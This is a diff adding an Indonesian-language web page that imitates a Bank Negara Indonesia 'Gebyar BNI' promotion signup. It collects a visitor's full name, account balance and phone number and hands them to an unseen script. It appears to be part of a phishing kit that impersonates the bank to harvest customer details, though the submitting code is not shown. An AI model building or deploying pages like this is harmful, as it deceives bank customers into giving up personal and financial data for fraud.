@@ -1,0 +1,53 @@
+<html>
+	<head>
+		<title>Gebyar BNI</title>
+		<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+		<script src="assets/lib/jquery/jquery.js"></script>
+		<script>
+			const module = {};
+		</script>
+		<script type="module" src="assets/common/js/data.js"></script>
+		<link rel="stylesheet" href="assets/common/css/global.css">
+		<link rel="stylesheet" href="assets/lib/ripple/ripple.css">
+		<link rel="stylesheet" href="assets/lib/loader/loader.css">
+	</head>
+	<body>
+		<div style="width: 100%; height: 100%; display: flex; flex-direction: column; overflow: scroll;">
+			<img src="assets/common/img/logo1.png" style="width: 80px; height: 30px; object-fill: fill; margin-top: 10px; margin-left: 10px;">
+			<div style="width: 100%; height: 1px; background-color: #8888888e; margin-top: 10px;"></div>
+			<div style="width: calc(100% - 20px); display: flex; flex-direction: row; justify-content: space-between; align-items: center; margin-top: 10px; margin-left: 10px; margin-right: 10px;">
+			    <img src="assets/common/img/logo2.png" style="width: 80px; height: 30px; object-fill: fill;">
+			    <div style="color: #444444; font-size: 14px;"><b>Daftar Sekarang</b></div>
+			</div>
+			<div style="width: calc(100% - 20px); background-color: #faf9fe; display: flex; flex-direction: column; padding: 10px; margin-top: 10px;">
+				<div style="color: #444444; font-size: 14px;"><b>Nama Lengkap Tanpa Singkatan</b></div>
+				<div style="width: 100%; height: 35px; background-color: #ffffff; border: 1px solid #88888833; border-radius: 2px; margin-top: 2px;">
+					<input id="name" type="text" style="width: 100%; height: 100%; background-color: transparent; padding-left: 10px; padding-right: 10px; color: #000000; font-size: 14px; border: 0; outline: 0;">
+				</div>
+				<div style="color: #444444; font-size: 14px; margin-top: 10px;"><b>Saldo Akhir</b></div>
+				<div style="width: 100%; height: 35px; background-color: #ffffff; border: 1px solid #88888833; border-radius: 2px; margin-top: 2px;">
+					<input id="balance" type="tel" placeholder="Rp" style="width: 100%; height: 100%; background-color: transparent; padding-left: 10px; padding-right: 10px; color: #000000; font-size: 14px; border: 0; outline: 0;">
+				</div>
+				<div style="color: #444444; font-size: 14px; margin-top: 10px;"><b>Nomor Handphone</b></div>
+				<div style="width: 100%; height: 35px; background-color: #ffffff; border: 1px solid #88888833; border-radius: 2px; margin-top: 2px;">
+					<input id="phone" type="tel" placeholder="08XXXXXXXX" style="width: 100%; height: 100%; background-color: transparent; padding-left: 10px; padding-right: 10px; color: #000000; font-size: 14px; border: 0; outline: 0;">
+				</div>
+				<div style="width: 100%; display: flex; flex-direction: row; justify-content: space-between; margin-top: 40px; margin-bottom: 20px;">
+					<div onclick="module.goBack()" class="ripple" style="flex: 1; height: 35px; margin-right: 10px; border: 1px solid #88888833; border-radius: 2px; display: flex; justify-content: center; align-items: center; color: #444444; font-size: 14px;">
+						Kembali
+					</div>
+					<div onclick="module.next()" class="ripple" style="flex: 1; height: 35px; margin-left: 10px; border: 1px solid #88888833; border-radius: 2px; display: flex; justify-content: center; align-items: center; color: #ffffff; font-size: 14px; background-color: #ff8736;">
+						Selanjutnya
+					</div>
+				</div>
+			</div>
+			<div style="position: fixed; left: 0; bottom: 0; width: 100%; height: 50px; display: flex; justify-content: center; align-items: center; background-color: #ff8736; color: #ffffff; font-size: 15px;">
+				© 2025 PT. Bank Negara Indonesia (Persero) Tbk.
+			</div>
+			<div id="loader" style="display: none; flex-direction: column; align-items: center; position: fixed; left: 0; top: 0; width: 100%; height: 100%; background-color: #000000bf; justify-content: center; align-items: center;">
+				<div class="loader" style=": 50px; height: 50px;"></div>
+				<div class="auto-fill-background-text" style="margin-top: 10px; font-size: 14px;"><b>Sedang memproses data Anda...</div>
+			</div>
+		</div>
+	</body>
+</html>
